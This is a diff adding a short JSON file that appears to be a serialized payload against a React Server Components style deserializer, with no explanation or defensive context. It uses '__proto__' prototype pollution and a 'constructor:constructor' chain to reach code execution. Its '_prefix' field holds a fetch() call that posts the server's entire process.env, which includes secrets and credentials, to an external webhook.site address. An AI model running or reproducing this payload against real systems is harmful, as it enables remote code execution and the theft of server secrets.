@@ -1,0 +1,12 @@
+{
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": "{\"then\": \"$B0\"}",
+    "_response": {
+        "_prefix": "fetch('https://webhook.site/5ff5bca5-f33a-49c3-9c79-d7c7766ff2d1', {method: 'POST', body: JSON.stringify(process.env)});",
+        "_formData": {
+            "get": "$1:constructor:constructor"
+        }
+    }
+}
